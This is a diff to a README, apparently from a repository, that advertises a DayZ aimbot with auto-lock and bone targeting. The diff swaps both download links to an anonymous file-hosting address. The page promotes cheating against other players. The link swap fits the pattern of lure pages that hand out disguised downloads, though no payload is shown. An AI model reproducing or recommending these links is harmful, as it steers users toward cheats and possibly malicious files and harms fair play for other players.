@@ -4,14 +4,14 @@
 
 In **DayZ**, one bad aim moment can cost you your loot, base, or hours of survival. Whether you’re sniping from a treeline or holding down a hallway in a military base, **perfect shots mean everything**—and the **DayZ Aimbot** delivers. With **auto-lock**, **bone targeting**, and **smoothing for legit play**, this tool makes sure **your bullets always land first**. 💀
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/dayz/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload12.bitbucket.io)
 ---
 
 ## 🎯 What Is a DayZ Aimbot?
 
 It’s a cheat that automatically **locks your crosshair onto targets**, tracking their movement and adjusting for distance and positioning—whether you’re using rifles, SMGs, or pistols. This is **the ultimate ranged advantage** in a game where missing a shot often means starting over from scratch. 🧟‍♂️
 
-[![Download Aimbot](https://yougame.biz/proxy.php?image=https%3A%2F%2Fftp.rentshops.ru%2Fshop_3526%2F7b6a0118bc11a9c9b3a73c5642f5bc9b.jpeg&hash=4f25a8f7dc71c763652312a11f956e5a)](https://wecheaters.github.io/cheats/dayz/)
+[![Download Aimbot](https://yougame.biz/proxy.php?image=https%3A%2F%2Fftp.rentshops.ru%2Fshop_3526%2F7b6a0118bc11a9c9b3a73c5642f5bc9b.jpeg&hash=4f25a8f7dc71c763652312a11f956e5a)](https://fileoffload12.bitbucket.io)
 ---
 
 ## 🔥 Aimbot Features
